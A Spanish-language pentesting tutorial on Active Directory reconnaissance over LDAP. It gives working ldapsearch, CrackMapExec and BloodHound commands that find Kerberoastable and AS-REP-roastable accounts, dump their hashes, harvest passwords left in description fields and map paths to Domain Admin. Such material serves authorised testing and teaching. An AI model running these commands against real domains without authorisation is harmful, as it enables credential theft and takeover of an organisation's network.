# Reconocimiento — Enumeración LDAP de Active Directory

El primer paso tras obtener credenciales de dominio (o en null session) es
mapear completamente la estructura del AD: usuarios, grupos, equipos, GPOs
y relaciones de confianza.

---

## ¿Qué es LDAP en AD?

Active Directory expone toda su información a través de LDAP (puerto 389)
y LDAPS (636). Con credenciales válidas se puede leer prácticamente todo
el directorio — usuarios, contraseñas antiguas en descripción, SPNs, ACLs...

```
Atacante ──[LDAP Query]──► DC:389 ──► Respuesta con objetos AD
```

---

## Herramientas y técnicas

### ldapsearch (línea de comandos)

```bash
# Variables de entorno para no repetirlas
DC="192.168.1.10"
DOMAIN="empresa.local"
USER="juan.garcia@empresa.local"
PASS="Password123!"
BASE="DC=empresa,DC=local"

# Enumerar TODOS los usuarios
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(objectClass=user)" \
    cn sAMAccountName description memberOf pwdLastSet lastLogon \
    userAccountControl servicePrincipalName

# Buscar usuarios con SPN (Kerberoastables)
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(&(objectClass=user)(servicePrincipalName=*))" \
    cn sAMAccountName servicePrincipalName

# Buscar usuarios sin pre-autenticación Kerberos (AS-REP Roastables)
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    cn sAMAccountName

# Enumerar grupos privilegiados
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(&(objectClass=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Schema Admins)))" \
    cn member

# Enumerar equipos del dominio
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(objectClass=computer)" \
    cn dNSHostName operatingSystem lastLogonDate

# Buscar contraseñas en atributos de descripción (error común de admins)
ldapsearch -x -H ldap://$DC -D $USER -w $PASS -b $BASE \
    "(objectClass=user)" cn description | grep -i "pass\|pwd\|password\|clave"
```

### CrackMapExec

```bash
# Enumerar usuarios
crackmapexec ldap $DC -u $USER -p $PASS --users

# Enumerar grupos
crackmapexec ldap $DC -u $USER -p $PASS --groups

# Usuarios Kerberoastables
crackmapexec ldap $DC -u $USER -p $PASS --kerberoasting output.txt

# AS-REP Roastable
crackmapexec ldap $DC -u $USER -p $PASS --asreproast output.txt

# Identificar usuarios con PasswordNotRequired
crackmapexec ldap $DC -u $USER -p $PASS --password-not-required
```

### Script propio — ad_enum.py

```bash
# Enumeración completa con reporte
python3 scripts/ad_enum.py --dc $DC --domain $DOMAIN -u $USER -p $PASS

# Solo kerberoastables y AS-REP
python3 scripts/ad_enum.py --dc $DC --domain $DOMAIN -u $USER -p $PASS --attack-paths
```

---

## Filtros LDAP esenciales

| Filtro | Qué busca |
|--------|-----------|
| `(objectClass=user)` | Todos los usuarios |
| `(objectClass=computer)` | Todos los equipos |
| `(objectClass=group)` | Todos los grupos |
| `(servicePrincipalName=*)` | Usuarios con SPN → **Kerberoastables** |
| `(userAccountControl:1.2.840.113556.1.4.803:=4194304)` | Sin pre-auth → **AS-REP Roastables** |
| `(userAccountControl:1.2.840.113556.1.4.803:=2)` | Cuentas deshabilitadas |
| `(adminCount=1)` | Usuarios con AdminSDHolder aplicado |
| `(memberOf=CN=Domain Admins,CN=Users,DC=...)` | Miembros de Domain Admins |

---

## userAccountControl — Flags importantes

El atributo `userAccountControl` es un bitmask. Los valores más relevantes:

| Valor | Flag | Significado |
|-------|------|-------------|
| 2 | ACCOUNTDISABLE | Cuenta deshabilitada |
| 32 | PASSWD_NOTREQD | No requiere contraseña |
| 64 | PASSWD_CANT_CHANGE | No puede cambiar contraseña |
| 512 | NORMAL_ACCOUNT | Cuenta de usuario estándar |
| 65536 | DONT_EXPIRE_PASSWORD | Contraseña no expira |
| 4194304 | DONT_REQ_PREAUTH | **Sin pre-auth Kerberos → AS-REP Roastable** |

---

## BloodHound — Análisis gráfico del dominio

BloodHound construye un grafo de relaciones entre objetos AD e identifica
automáticamente el camino más corto desde cualquier usuario hasta Domain Admin.

```bash
# 1. Iniciar Neo4j (base de datos de BloodHound)
sudo neo4j start
# Abrir http://localhost:7474 y cambiar contraseña (neo4j:neo4j → neo4j:bloodhound)

# 2. Iniciar BloodHound
bloodhound &

# 3. Recolectar datos con SharpHound (desde Windows con credenciales de dominio)
# En la workstation Windows:
# SharpHound.exe -c All --zipfilename loot.zip

# 4. Alternativa desde Kali: BloodHound.py
pip install bloodhound
bloodhound-python -d empresa.local -u juan.garcia -p 'Password123!' \
    -ns 192.168.1.10 -c All

# 5. Importar los JSON en BloodHound (arrastrar y soltar)
# 6. Queries útiles:
#    - "Find Shortest Paths to Domain Admins"
#    - "Find Principals with DCSync Rights"
#    - "Shortest Path from Owned Principals"
```

---

## Qué buscar en el reconocimiento

Lista de "premios" que hay que identificar en esta fase:

```
CRITICO:
  [ ] Usuarios con SPN (Kerberoasting)
  [ ] Usuarios sin pre-auth (AS-REP Roasting)
  [ ] Contraseñas en atributo 'description'
  [ ] Usuarios con AdminCount=1

ALTO:
  [ ] Cuentas de servicio con permisos excesivos
  [ ] Equipos con Unconstrained Delegation
  [ ] Grupos anidados con acceso privilegiado (BloodHound)
  [ ] GPOs aplicadas a OUs críticas

MEDIO:
  [ ] Usuarios inactivos con contraseñas válidas
  [ ] Cuentas de administración compartidas
  [ ] Trusts de dominio externos
```
